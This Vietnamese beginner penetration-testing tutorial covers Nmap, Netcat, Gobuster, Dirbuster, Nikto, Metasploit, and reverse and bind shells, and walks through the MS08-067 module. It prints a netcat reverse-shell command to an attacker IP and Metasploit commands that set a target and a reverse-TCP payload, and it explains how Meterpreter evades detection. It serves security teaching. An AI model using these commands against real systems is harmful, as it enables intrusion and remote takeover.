# Bài 1: Nmap và Netcat
## Công cụ Nmap
### Nmap là gì?
Nmap, viết tắt của Network Mapper, là một công cụ miễn phí và mã nguồn mở được sử dụng cho mục đích thu thập thông tin của mạng mục tiêu hoặc kiểm tra an ninh của hệ thống mạng đang quản lý. 

Nmap có thể được sử dụng để:

* Xác định tất cả các hosts hoặc servers hiện có trong mạng
* Xác định một server đang mở những ports nào và những dịch vụ nào đang chạy trên các ports đó
* Xác định các dịch vụ cần chạy trên host hoặc server có đang hoạt động tốt không? (Nếu dịch vụ ngừng chạy, ports sẽ bị đóng)
* Xác định những hosts hoặc servers đang chạy hay đang tắt
* Xác định hệ điều hành đang chạy của một host hoặc server
* Quét lỗi bảo mật các dịch vụ đang được chạy trên một host hoặc server
* Kiểm tra xem tường lửa có khóa các ports không được phép truy cập không?
* v.v

#### Khi chạy Nmap trên giao diện dòng lệnh, bạn cần phải chạy với sudo. Trong suốt quá trình quét mục tiêu, Nmap sẽ có lúc cần những tài nguyên hệ thống hoặc phân quyền ở cấp root, đó là lí do Nmap cần chạy với sudo hoặc với root.
### Cách thức sử dụng Nmap
```nmap <tùy-chọn-flags> <IP-mục-tiêu>```

Nmap sẽ chỉ scan 1000 TCP ports phổ biến nhất mà thôi và nó cũng sẽ không xuất ra bất cứ thông tin gì trong suốt quá trình scan; chỉ cho đến khi scan xong toàn bộ 1000 TCP ports thì nó mới xuất ra kết quả.

Điều này dẫn đến vài bất tiện sau:

1. Bạn không hề biết quá trình scan đang diễn ra thế nào, liệu có lỗi gì hay không và liệu bạn phải chờ trong bao lâu?
2. Rất nhiều server chạy các services quan trọng trên UDP ports hoặc các TCP ports trải dài từ port 1000 đến port 65535. Do đó việc chạy Nmap như trên sẽ có khả năng bỏ lỡ rất nhiều thông tin quan trọng.

Các flags thường được sử dụng phổ biến bao gồm:
* -v (verbose): In ra thông tin liên quan đến quá trình scan theo thời gian thực. Có nghĩa là bạn sẽ biết được Nmap đang chạy như thế nào? Đã phát hiện được những ports nào? v.v. Bạn càng sử dụng nhiều flag -v thì thông tin về quá trình scan được xuất ra càng chi tiết. Tuy nhiên, để tránh quá nhiều thông tin gây nhiễu, cá nhân mình thường chỉ dùng 2 flags -v mà thôi (-vv).
* –sn (scan whole network): Flag -sn dùng để scan toàn bộ mạng của đối tượng nhằm tìm ra các hosts và servers đang hoạt động bên trong mạng.
  
  ```	nmap -sN <IP-mục-tiêu>/<subnet-mask>```

* -A: enable "aggressive mode"(Enables OS detection, version detection, script scanning, and traceroute)
* -Pn: Trước khi tiến hành scan ports trên server đối tượng mục tiêu, Nmap sẽ kiểm tra xem server mục tiêu có đang online hay không? Quá trình này sẽ tốn một khoản thời gian nhất định. Do đó nếu bạn đã biết chắc chắn server mục tiêu luôn luôn online, bạn có thể bỏ qua bước xác định này với flag -Pn. Lúc này, Nmap sẽ mặc định tất cả những hosts hoặc servers bạn muốn quét đều đang online và sẽ bỏ qua quá trình xác định trạng thái hoạt động của (các) mục tiêu.
* -p-: Khi sử dụng flag -p-, Nmap sẽ tự động scan 65535 ports của mục tiêu. Quá trình này tuy tốn rất nhiều thời gian, nhưng là một quy trình quan trọng và chúng ta không nên bỏ qua.
* -sV (scan service version): Flag -sV sẽ cho bạn biết những dịch vụ nào đang được chạy ứng với những ports vừa tìm được, đồng thời cung cấp tên và version của những dịch vụ đó. Đây là thông tin rất hữu ích trong quá trình tìm lỗi xâm nhập trong pentest
* -sU (scan UDP ports): Scan tất cả UDP ports. Đôi khi sẽ có những dịch vụ chạy trên cả UDP ports, do đó khi pentest các bạn nhớ scan cả UDP ports nhé.
* -O (OS scan): Xác định hoặc dự đoán hệ điều hành đang được chạy trên server hoặc host mục tiêu
* -T<0-5>: T càng lớn thì thời gian quét càng nhanh, ví dụ thời gian quét của T5 sẽ nhanh hơn T4. Tuy nhiên, việc sử dụng T càng lớn, đòi hỏi kết nối mạng của bạn phải càng ổn định và càng mạnh, cũng như việc quét quá nhanh sẽ buộc Nmap phải gửi các gói tin đi một cách ồ ạt dễ gây chú ý đến quản trị viên của hệ thống mục tiêu.
* sC (script scan): Với flag -sC, Nmap sẽ sử dụng những scripts tìm lỗi hoặc thu thập thông tin (được gọi là Nmap Scripting Engine – NSE) mặc định được tích hợp bên trong để thu thập thông tin hoặc quét lỗi bảo mật trên hệ thống mục tiêu.
  * Ngoài ra, bạn có thể sử dụng flag –script để chạy một script tìm lỗi nhất định nào đó thay vì chạy các scripts được mặc định của Nmap. Để xem tất cả các scripts được tích hợp bên trong Nmap, các bạn có thể sử dụng câu lệnh sau:
    
      ```ls /usr/share/nmap/scripts```
## Công cụ Netcat (nc)
### Giới thiệu công cụ Netcat 
Netcat hay còn được viết tắt là nc là một công cụ trên giao diện dòng lệnh tuy đơn giản nhưng lại cực kỳ mạnh mẽ. Netcat được cài mặc định trên rất nhiều Linux distros ví dụ Ubuntu, Kali Linux, v.v. Necat có thể được cài đặt và sử dụng không chỉ trên các hệ điều hành Linux, mà còn cả cho Windows và MacOS nữa.

Netcat có thể được sử dụng cho các mục đích sau:

* Port scanning – nhằm xác định xem port đang mở hay đang đóng
* Truyền dữ liệu giữa 2 máy
* Lắng nghe kết nối đến (dùng để đón reverse shell).
* Tạo backdoor (cổng hậu)
* v.v.

Cú pháp của câu lệnh Netcat như sau:  ```nc <tùy-chọn-flag> <IP> <Port>```
### Một số câu lệnh Netcat hay được sử dụng
#### Câu lệnh 1: Đón reverse shell bằng Netcat
```nc -nlvp <Port-lắng-nghe-reverse-shell>```

Câu lệnh trên có các thành phần sau:

* -n: Mang ý nghĩa chúng ta sẽ chỉ dùng IPv4 address, không dùng domain name
* -l: Chế độ lắng nghe các kết nối đến
* -v: Verbose – Cho biết quá trình lắng nghe đang diễn ra thế nào
* -p: Chỉ định port để lắng nghe

Một cách ngắn gọn, câu lệnh trên sẽ mở port 8000 trên máy của hacker ở trạng thái lắng nghe các kết nối trỏ đến port 8000.
#### Câu lệnh 2: Tạo kết nối reverse shell
```nc -e /bin/sh <IP-của-hacker> <Port-đang-đợi-reverse-shell>```

Trong đó:

* -e /bin/sh: Sau khi kết nối thành công để mục tiêu thì thực thi /bin/sh (tuy nhiên không phải version nào của Netcat cũng sẽ hỗ trợ flag -e)
#### Câu lệnh 3: Chuyển file giữa 2 máy 
```
nc -w 3 <IP-điểm-đến> <Port-đang-chờ> < <tên-file-cần-chuyển>
Ví dụ:
nc -w 3 192.168.0.12 8888 < hello.txt
```

Trong đó:

* -w 3: Dùng để chỉ thời gian mà Netcat sẽ chờ phản hồi từ đích đến, nếu không có bất cứ phản hồi nào, Necat sẽ tự động hủy kết nối sau 3 giây.

Câu lệnh trên có nghĩa là chúng ta sẽ dùng Netcat tạo một kết nối đến port 8888 của địa chỉ 192.168.0.12 và sẽ chuyển file hello.txt tới địa chỉ IP đó thông qua kết nối vừa được tạo. Netcat sẽ chờ máy 192.168.0.12 trong 3 giây, nếu máy đích đến không phản hồi, Netcat sẽ tự động ngắt kết nối. 

Trên máy nhận file:

Chúng ta chạy câu lệnh sau:

```
nc -lp <Port> > <Tên-file-nhận>
Ví dụ: 
nc -lp 8888 > hello.txt
```

Câu lệnh trên có nghĩa là chúng ta sẽ mở port 8888 và lắng nghe các kết nối trỏ tới. Khi có kết nối trỏ tới và file hello.txt được chuyển đến, chúng ta sẽ xuất dữ liệu được chuyển ra và lưu vào file có tên hello.txt trên máy nhận file. 

# Bài 2: Web hidden files/directories và các công cụ Gobuster, Dirbuster và Nikto
## Web hidden files/directories là gì? 
Web server giống như một ổ cứng lưu trữ dữ liệu trên máy tính. Dữ liệu lưu trữ có thể bao gồm files, directories, v.v. Những dữ liệu được lưu trữ trên web server có thể là dữ liệu công khai (public) ví dụ như trang chủ của một website, những đường link dẫn đến những chuyên mục khác nhau (catergories) hoặc bài viết khác nhau của website đó, v.v. ; hoặc cũng có thể là dữ liệu riêng tư (private) ví dụ như trang đăng nhập, file robots, files hay directories chia sẻ thông tin nội bộ, v.v. 
### Web URL trên Linux web server
Giống path trong linux
### Web hidden directories 
Những nội dung (files và directories) không được đề cập và không có đường dẫn đến trên trang chủ và thanh menu chính là những nội dung ẩn

***Phần dưới là các công cụ tìm hidden files mn có thể search gg để biết chi tiết vì mình dùng dirsearch nên cũng chỉ nói qua mấy cái này vì cơ bản thì tools tìm hidden files hầu như tìm theo kiểu brute force trong worldlist***
## Gobuster hoạt động như thế nào?
Gobuster là một công cụ được viết bằng Golang. Đây là một công cụ mã nguồn mở miễn phí trên giao diện dòng lệnh, được sử dụng để tìm các files cũng như directories ẩn thông qua hình thức tấn công Brute Force
### Gobuster hoạt động như thế nào? 
Gobuster sẽ cần một wordlists (danh sách) những tên files hoặc tên directories thường hay được sử dụng nhất trên web server. Gobuster sẽ sử dụng những cái tên trong wordlists này kết hợp với URL của website để tạo thành một URL mới và sẽ thử truy cập vào URL mới này
### Sử dụng Gobuster như thế nào? 
Một câu lệnh Gobuster điển hình để tìm các files và directories ẩn sẽ như sau:

```gobuster dir -w <tên-wordlists> -u <IP-mục-tiêu> -x <tên-extension>```

Trong câu lệnh trên, chúng ta có sử dụng thêm flag -x dùng để liệt kê những extension file mà chúng ta muốn tìm. Những extension này sẽ được kết hợp với tên file trong wordlists để tạo thành tên một file hoàn chỉnh. 

```
Lưu ý:
File wordlists càng lớn và extension càng nhiều thì thời gian chạy Gobuster sẽ càng lâu. Do đó để hạn chế bớt extension không cần thiết, bạn phải xác định xem server hiện tại đang chạy Linux hay Windows thông qua Nmap. Đồng thời cố gắng xác định xem web app hiện tại đang chạy trên web platform hoặc ngôn ngữ nào? Ví dụ như WordPress, Django, v.v.
Ví dụ, chúng ta biết được web hiện đang chạy trên Linux Server và dùng WordPress. Vậy các extensions thường gặp có thể sẽ là: .php, .sh, .txt, pl, py, rb.
```
## Công cụ Dirbuster 
Cũng giống như Gobuster, Dirbuster là một công cụ tìm files và directories ẩn thông qua hình thức tấn công Brute Force. Dirbuster cũng là một công cụ miễn phí, chỉ có điều công cụ này có giao diện người dùng và giải quyết được một vấn đề mà Gobuster không thể làm, đó là recursive. 

Nghĩa là, với Gobuster, khi nó tìm được một directory, nó sẽ in ra tên directory đó và tiếp tục đi tìm những directories khác dựa vào wordlists đã cung cấp, chứ nó không đi vào bên trong directory đã tìm được và in ra các nội dung nằm bên trong. Dirbuster có thể làm được điều đó, nhưng bù lại Dirbuster không nhanh như Gobuster và dễ bị lỗi hơn Gobuster. 

```
Lưu ý:
Gobuster và Dirbuster không phải là 2 công cụ duy nhất để tìm files và directories ẩn, chúng ta còn có các công cụ khác như dirb, dirbsearch, dirscan, v.v. Mỗi công cụ sẽ có những ưu nhược điểm khác nhau. Bạn có thể chọn bất cứ công cụ nào mà bạn thích để tìm nội dung web ẩn, nhưng hãy luôn nắm rõ điểm yếu và điểm mạnh mà công cụ bạn đang dùng nhé.
```
## Công cụ Nikto 
Nikto là một công cụ miễn phí và mã nguồn mở. Nikto được sử dụng chủ yếu để quét lỗi bảo mật trên web server. Khi tiến hành quét lỗi với Nikto, nó sẽ thực hiện hơn 6000 bài kiểm tra trên đối tượng để tìm ra các lỗ hổng bảo mật trên web server, lỗi đó có thể xuất phát từ chính những dịch vụ chạy trên web server hoặc cũng có thể lỗi xuất phát từ quá trình cấu hình web server. 

Trên thực tế, Nikto chỉ được sử dụng để quét lỗi nhanh cũng như thu thập thông tin nhạy cảm của web server để từ đó xác định xem web server có dính phải những lỗ hổng nghiêm trọng và phổ biến hay không. 

Một lưu ý khi dùng Nikto đó là không phải tất cả thông tin hiện ra khi chạy Nikto đều là lỗ hổng bảo mật, có những kết quả sẽ chỉ là thông tin của website mà Nikto tìm được thôi. 
# Bài 3: Giới thiệu Metasploit Framework
## Metasploit là gì? 
### Giới thiệu về Metasploit
Metasploit là một nền tảng phục vụ cho mục đích kiểm định bảo mật trên giao diện dòng lệnh

Metasploit được viết bằng ngôn ngữ Ruby. Bản chất của Metasploit hiểu theo cách đơn giản nhất chính là một kho chứa các đoạn code được viết bằng Ruby nhằm mục đích kiểm tra bảo mật của hệ thống hoặc ứng dụng. Các đoạn code này có thể dùng để tấn công, xâm nhập, leo thang đặc quyền, thu thập dữ liệu, quét lỗi, chuyển dữ liệu giữa máy tấn công và máy nạn nhân, v.v. trên nhiều nền tảng khác nhau từ smart devices (Android, IOS), máy tính (Linux, Mac, Windows), các thiết bị IoT, v.v. 

Vì bản thân Metasploit chứa các phần mềm nguy hiểu như vậy nên Metasploit không được khuyến khích cài trên các máy được sử dụng cho mục đích thường nhật hàng ngày vì có thể dẫn đến tình trạng người dùng hệ thống có cài Metasploit sẽ bị tấn công ngược lại. Các phần mềm diệt virus (AV) cũng coi Metasploit là một mối nguy hiểm, nên khi quét thấy Metasploit, các AV sẽ xóa nó ngay. 

Metasploit chỉ nên được dùng trên máy ảo hoặc máy dành riêng cho mục đích pentest và được chạy trên các hệ điều hành đã được tùy biến cho mục đích pentest như Kali Linux, Parrot Linux hay Windows Commando, v.v. 

Metasploit không chỉ đơn giản là một kho “chứa vũ khí” dành cho việc kiểm định hệ thống. Nó còn có thể được dùng để giúp pentesters tiết kiệm thời gian tìm và xâm nhập các lỗ hổng đã được tìm ra nhưng chưa được vá trên hệ thống mục tiêu, điều này cho phép pentesters có thể tập trung vào các lỗi liên quan đến chính sách (policies), social engineering hay các lỗ hổng zero day, v.v.

Để sử dụng hiệu quả Metasploit bạn cần 2 điều sau:

* Một máy ảo hoặc thiết bị có chạy hệ điều hành tùy biến cho mục đích pentest có đi kèm Metasploit
* Kiến thức về Penetration Testing

Tóm lại, có thể coi Metasploit là một khẩu súng, và để tránh bắn vào chân mình cũng như để sử dụng nó hiệu quả. Bạn cần phải có đủ kiến thức để sử dụng khẩu súng ấy
# Bài 4: Khái niệm payloads (shellcode) và phân tích module tấn công MS08-067 của Metasploit
## Payloads hay shellcode là gì? 
payloads hay còn được gọi là shellcode là một đoạn code thường được viết dưới dạng machine code (binary) dùng để thực hiện mục đích của pentester sau khi xâm nhập thành công vào hệ thống của nạn nhân.
Các phần mềm khai thác lỗ hổng Remote Code Execution (RCE) (ở mức độ dễ hiểu nhất) thường sẽ có 3 thành phần chính như sau: 

* Phần khai thác lỗi để xâm nhập mục tiêu
* Phần payload để thực hiện mục đích của pentester sau khi xâm nhập
* Phần quản lý để thông báo cho pentester biết phần mềm đã xâm nhập thành công hay chưa hoặc có lỗi gì xảy ra trong quá trình chạy phần mềm hay không? v.v

Ví dụ về payload:
Hẳn các bạn còn nhớ đến con ransomware WannyCry từng làm mưa là gió một toàn thế giới cách đây vài năm chứ?

Con ransomware này khai thác một lỗi trên hệ thống Windows có tên là EternalBlue hay tên mã là MS17-010 để xâm nhập vào hệ thống Windows, sau đó nó sẽ chạy một payload đã được hacker cài sẵn để tự động mã hóa toàn bộ dữ liệu trên máy của nạn nhân, đồng thời mở một kết nối Internet từ máy nạn nhân đến một server được hacker kiểm soát nhằm nhận lệnh của hacker.

Khi chạy phần mềm khai thác lỗi để xâm nhập, nếu WannaCry được báo lỗi không thể xâm nhập (có thể do máy nạn nhân không nằm trong danh sách hệ điều hành Windows bị dính lỗi hoặc do nạn nhân dùng MacOS hay Linux) nó sẽ bỏ qua máy đó và tìm đến một mục tiêu khác.

### Reverse shell, Bind shell và Meterpreter 
#### Reverse shell:
Quy trình như sau:
1. Bạn sẽ tạo một payload có chức năng mở một kết nối TCP trỏ ngược về một port đang chờ sẵn kết nối trên máy của bạn
2. Đính kèm payload đó vào phần mềm tấn công
3. Dùng Netcat (nc) để mở port mà bạn đã chỉ định trong payload và chờ kết nối
4. Chạy phần mềm tấn công
5. Khi payload được chạy trên máy nạn nhân, nó sẽ tạo ra một kết nối TCP trỏ đến port trên máy của bạn mà bạn đã chỉ định. Kết nối này có kèm shell cho phép bạn có thể điều khiển máy nạn nhân từ xa. Dạng kết nối này được gọi là Reverse shell do shell điều khiển máy nạn nhân chạy ngược (reverse) về máy của bạn. 
#### Bind shell:
Trái ngược với Reverse shell, quy trình cụ thể như sau:
1. Bạn sẽ tạo một bind shell payload
2. Đính kèm vào phần mềm tấn công
3. Chạy phần mềm tấn công
4. Khi payload được chạy trên máy nạn nhân, nó sẽ chạy chương trình shell trên một port của chính máy nạn nhân
5. Để có thể điều khiển được máy nạn nhân, bạn cần phải dùng Netcat (nc) để kết nối (bind) đến port đang chạy shell trên máy nạn nhân mà bạn đã chỉ định trong payload. Tuy nhiên, với những tính năng vượt trội của các chương trình diệt virus (AV) hiện nay, tính hiệu quả của bind shell hiện khá thấp. 
#### Meterpreter
Cụ thể, với Meterpreter quy trình thực hiện cũng giống với Reverse shell, chỉ khác ở hai chỗ duy nhất:
* Thay vì tạo Reverse shell payload, bạn sẽ tạo Meterpreter payload
* Meterpreter payload không thể kết nối với máy tấn công bằng Netcat, nó cần một phần mềm có tên là Metasploit Multi Handler (được tích hợp với Metasploit) để có thể kết nối thành công giữa máy nạn nhân và máy tấn công từ đó cho phép bạn điều khiển máy nạn nhân từ xa 

Thật chất, Meterpreter cũng sử dụng Reverse TCP shell (Reverse shell) để tạo kết nối từ máy nạn nhân đến máy tấn công thôi. Nhưng nó lại được thiết kế đặc biệt hơn Reverse shell thông thường ở những điểm sau:

* Meterpreter có phần vượt trội hơn Reverse shell thông thường ở chỗ nó sử dụng hình thức tấn công in-memory DLL injection để tạo kết nối đến máy tấn công. Điều này có nghĩa là dữ liệu của Meterpreter chỉ được lưu trên RAM (dữ liệu RAM sẽ bị mất khi máy nạn nhân tắt hoặc mất nguồn điện) và không lưu dữ liệu trên ổ cứng. Điều đó có nghĩa là dấu vết để lại trên máy nạn nhân sẽ ít hơn và làm giảm nguy cơ bạn bị phát hiện. 
* Meterpreter cũng không tạo tác vụ mới như Reverse shell thông thường mà nó chỉ trú ẩn trong các tác vụ (processes) đã bị nó kiểm soát, điều này cho phép nó có thể chuyển từ các tác vụ bị nó kiểm soát sang các tác vụ đang chạy bình thường khác. Đây cũng là một yếu tố giúp bạn tránh bị phát hiện.
* Meterpreter được trang bị những tính năng đặc biệt phục vụ quá trình pentest hiệu quả hơn. Một trong số đó là chức năng “getsystem” (chỉ hoạt động trên hệ thống Windows).

```Netcat chỉ có thể bắt được stageless payloads chứ không bắt được staged payloads. Vì Meterpreter là một staged payload, nên Netcat không thể bắt được nó.```
## Phân tích module tấn công MS08-067 của Metasploit
### Metasploit modules là gì? 
Metasploit là một tập hợp của các modules khác nhau. Mỗi modules có thể là một phần mềm tấn công hoặc có thể là một công cụ quét lỗi bảo mật, v.v. Metasploit có những modules có thể sử dụng cho bất cứ bước nào trong quy trình pentest. 

Để có thể xem các modules có trong Metasploit các bạn dùng câu lệnh sau trên Kali Linux: 

```ls /usr/share/metasploit-framework/modules```
### Phân tích modules tấn công MS08-067 trên Metasploit
Thông tin của mục tiêu như sau:

* Chạy hệ điều hành Windows XP x86
* Địa chỉ IPv4: 10.0.0.9
* Chạy SMB trên port: 556

Thông tin của máy tấn công như sau:

* Địa chỉ IPv4: 10.0.0.10
* Mở port: 8888
### Lỗi tấn công MS08-067 là gì? 
Đây là một lỗi bảo mật khá nghiêm trọng được công bố vào năm 2008. Lỗi bảo mật này nằm trên các hệ thống chạy Windows, trải dài từ Windows 2000 đến Windows 2008. Lỗi này cho phép hacker có thể xâm nhập máy nạn nhân mà không cần khai báo danh tính từ đó cho phép hacker có thể thực thi mã độc nhằm mục đích chiếm quyền điều khiển từ xa. 
### Phân tích module tấn công MS08-067 trên Metasploit
Đầu tiên, các bạn cần khởi động Metasploit lên với các câu lệnh sau:

![image](https://github.com/HoangVietAnh09/Others/assets/111860567/df50f6b8-409b-4391-a896-4ef0df8b590f)

Sau đó kết nối với metasploit bằng lệnh: ```msfconsole```

Sau đó, chúng ta dùng lệnh search để tìm modules MS08-: ```search ms08-067```

![image](https://github.com/HoangVietAnh09/Others/assets/111860567/546cb758-d5b4-4289-937a-2c814d48d220)

Để hiển thị thông tin chi tiết của lỗi cũng như của module khai thác lỗi, chúng ta sử dụng câu lệnh sau:  ```info 0```

Với 0 là số thứ tự (#) của modules trong hình. Và như vậy chúng ta sẽ có thông tin của lỗi và module khai thác lỗi như hình bên dưới. 

![image](https://github.com/HoangVietAnh09/Others/assets/111860567/272a6170-0c30-41c5-8263-2d8b74a2ddc5)

Để sử dụng lỗi khai thác này, chúng ta sẽ dùng lệnh: ```use 0```

![image](https://github.com/HoangVietAnh09/Others/assets/111860567/3763ac4f-e227-4002-9495-f4338561dbed)

Lúc này bạn sẽ thấy header command đã thay đổi từ msf6 sang msf6 exploit(windows/smb/ms08_067_netapi) nhằm cho biết chúng ta đang khai thác lỗi ms08-067, lỗi này khai thác lỗ hổng của giao thức SMB và là lỗi xảy ra trên hệ điều hành Windows.

windows/smb/ms08_067_netapi cũng có thể được xem là path của lỗi này, theo đó chúng ta có modules ms08_067_netapi nằm bên trong directory smb; directory smb nằm bên trong directory windows.

Với tất cả những modules của Metasploit, để có thể sử dụng được một module, bạn cần phải gán giá trị cho những options nằm trong module đó. Để hiện options của module MS08-067, bạn sử dụng câu lệnh sau: ```show options```

Chúng ta sẽ thấy modules MS08-067 cần những options sau:

* RHOST: Địa chỉ IP của máy nạn nhân
* RPORT: Port đang chạy dịch vụ SMB trên máy nạn nhân (mặc định là port 445)
* SMBPIPE: SMB pipe sẽ cho phép bạn tương tác với hệ thống Windows thông qua hệ thống mạng (mặc định là BROWSER)
* Payload options: Lựa chọn dạng payload sẽ chạy sau khi phần mềm khai thác lỗi xâm nhập thành công (mặc định là Meterpreter)
* EXITFUNC: Chỉ định DLL và function để gọi khi payload đã được chạy xong (mặc định là thread)
* LHOST: Địa chỉ IP của máy tấn công
* LPORT: Port đợi kết nối trỏ về

Để gán hoặc thay đổi giá trị của những options này chúng ta sẽ dùng lệnh set. 

Chúng ta sẽ gán giá thị RHOSTS bằng câu lệnh: ```set RHOSTS 10.10.10.9```

Thay đổi giá trị RPORT từ 445 thành 556 bằng câu lệnh sau: ```set RPORT 556```

Thay đổi địa chỉ IP của máy tấn công bằng câu lệnh sau: ```set LHOST 10.0.0.10```

Thay đổi port nhận shell của máy tấn công từ 4444 sang 8888 bằng câu lệnh sau: ```set LPORT 8888```

Sau đó, chúng ta dùng lệnh show options lần nữa để kiểm tra các giá trị ta vừa set

```
Lưu ý:
Khi gán giá trị, các bạn cần lưu ý cột “Required”, những options nào mà cột Required đề là “yes” thì bạn không được bỏ trống. 
```

Sau khi gán giá trị cho các options xong, để tiến hành tấn công, chúng ta sẽ dùng lệnh sau: ```exploit```

Đương nhiên, tấn công sẽ thất bại do hệ thống chúng ta tấn công hoàn toàn không tồn tại. 

Ngoài ra, chúng ta còn có thể thay đổi payload từ Meterpreter thành Reverse TCP shell bình thường với câu lệnh sau:

```set payload windows/shell_reverse_tcp```

# Bài 5: Thực hành tấn công webserver với Metasploit (Phần 1)
## Performing reconnaissance (thu thập thông tin mục tiêu) 
Metasploit có kèm cả Nmap nữa. Nên trong bài hôm nay, chúng ta sẽ sử dụng Nmap bên trong Metasploit để thu thập thông tin cần thiết của webserver mục tiêu. 

Nmap được tích hợp bên trong Metasploit sẽ được chia làm 2 câu lệnh sau:

* db_nmap: Khi sử dụng db_nmap chức năng hoàn toàn tương tự như Nmap bình thường thôi, tuy nhiên kết quả thu được từ db_nmap sẽ được lưu vào cơ sở dữ liệu PostgreSQL nhằm phục vụ cho việc truy xuất lại dữ liệu về sau.
* nmap: Câu lệnh Nmap bình thường, kết quả không được lưu vào cơ sở dữ liệu PostgreSQL của Metasploit.


























